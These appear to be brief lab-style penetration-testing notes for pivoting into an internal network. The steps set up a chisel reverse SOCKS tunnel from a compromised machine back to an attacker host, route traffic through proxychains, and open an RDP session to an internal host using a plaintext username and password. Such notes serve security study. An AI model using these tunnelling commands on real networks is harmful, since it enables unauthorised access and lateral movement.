# ATTACK HOST
```
sudo ./chisel server --reverse -v -p 1234 --socks5
```

# CONNECTING TO ATTACKER
```
./chisel client -v 10.10.14.17:1234 R:socks
```

# MODIFYING /etc/proxychains.conf
```
socks5 127.0.0.1 1080
```

# USING RDP
```
proxychains xfreerdp /v:172.16.5.19 /u:victor /p:pass@123
```
